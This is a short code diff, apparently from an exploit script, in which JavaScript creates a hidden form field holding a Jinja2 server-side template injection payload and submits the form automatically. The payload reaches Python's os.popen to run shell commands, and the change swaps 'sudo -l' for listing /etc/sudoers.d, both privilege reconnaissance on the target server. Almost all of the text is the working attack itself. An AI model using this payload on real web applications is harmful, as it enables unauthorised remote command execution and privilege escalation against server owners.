@@ -14,7 +14,7 @@
       const i = document.createElement('input');
       i.type = 'hidden';
       i.name = 'comment';
-      i.value = `{{request.application.__globals__.__builtins__.__import__('os').popen('sudo -l').read()}}`;
+      i.value = `{{request.application.__globals__.__builtins__.__import__('os').popen('ls -la /etc/sudoers.d').read()}}`;
       f.appendChild(i);
       document.body.appendChild(f);
       f.submit();
